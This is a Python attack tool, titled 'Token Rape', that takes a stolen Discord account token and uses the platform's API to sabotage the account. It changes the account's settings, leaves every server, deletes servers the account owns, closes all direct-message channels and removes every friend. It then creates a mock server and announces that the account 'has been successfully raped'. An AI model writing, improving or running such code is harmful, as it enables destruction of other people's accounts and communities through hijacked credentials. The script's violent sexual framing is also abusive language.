from re import M
import requests, time, sys, os, ctypes
from colorama import Fore

def main():
    ctypes.windll.kernel32.SetConsoleTitleW("Token Rape - Made by Astraa")
    tokenrape()
    print(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Enter the token of the account you want to rape: """)
    token = str(input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Token: """))
    try:
        headers = {
            'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
            'Authorization' : token
        }

        payload = {"theme" : "light","locale" : "ja","message_display_compact" : True,"inline_embed_media" : False,"gif_auto_play" : False,"render_embeds" : False,"render_reactions" : False,"animate_emoji" : False,"convert_emoticons" : False,"enable_tts_command" : False,"explicit_content_filter" : 0,"status" : "invisible"}

        print(f"""\n\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTGREEN_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Changeing settings""")
        input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Press ENTER to Changing Settings""")
        requests.patch(
            "https://canary.discordapp.com/api/v6/users/@me/settings",
            headers = headers,
            json = payload
        )
        print(f"\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTGREEN_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Detecting servers\n")
        time.sleep(1)

        guilds = requests.get(
            "https://discord.com/api/v6/users/@me/guilds",
            headers = headers
        ).json()

        print(f"""          {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } {len(guilds)} servers found\n""")
        input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Press ENTER to leave all Servers""")

        for i in guilds:
            try:
                print(f"""          {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTRED_EX }!{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Leaving {i['name']} | Owner: {i['owner']}""")
                if not i["owner"]:
                    responce = requests.delete(
                        f"https://discord.com/api/users/@me/guilds/{i['id']}",
                        headers = headers
                    )
                else:
                    responce = requests.delete(
                        f"https://discord.com/api/guilds/{i['id']}",
                        headers = headers
                    )
            except Exception as e:
                print(e)

        print(f"\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTGREEN_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Detecting DM channels\n")
        time.sleep(1)

        dms = requests.get(
            "https://discord.com/api/v6/users/@me/channels",
            headers = headers
        ).json()
        print(f"""          {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } {len(guilds) - 1} DM channels found\n""")
        input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Press ENTER to leave all DM""")

        for i in dms:
            print(f"""          {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTRED_EX }!{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Leaving DM channel with: {', '.join([x['username'] for x in i['recipients']])}""")
            responce = requests.delete(
                f"https://discord.com/api/channels/{i['id']}",
                headers = headers
            )

        print(f"\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTGREEN_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Detecting relationships\n")
        time.sleep(1)

        relations = requests.get(
        "https://discord.com/api/v8/users/@me/relationships",
        headers = headers
        ).json()

        relations = [i for i in relations if i["type"] != 0]

        print(f"""          {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } {len(relations)} relationships found""")
        input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Press ENTER to remove all friends""")

        for i in relations:
            print(f"""\n          {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTRED_EX }!{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Removing {i['user']['username']} from relationships""")
            responce = requests.put(
                f"https://discord.com/api/v8/users/@me/relationships/{i['user']['id']}",
                headers = headers,
                json = {"type":0}
            )

        guild = {
            "channels" : None,
            "icon" : "https://www.pngmagic.com/product_images/three-hearts-png.png",
            "name" : "Love U",
            "region" : "japan"
        }
        requests.post(
            'https://discordapp.com/api/v6/guilds',
            headers = headers,
            json = guild
        )

        print(f"""\n\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Account has been successfully raped""")
        input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Press ENTER to exit""")

    except:
        print(f"""      {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTRED_EX }!{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } There is a problem with your Token.""")
        time.sleep(2)
        os.system('cls')
        exit(0)

main()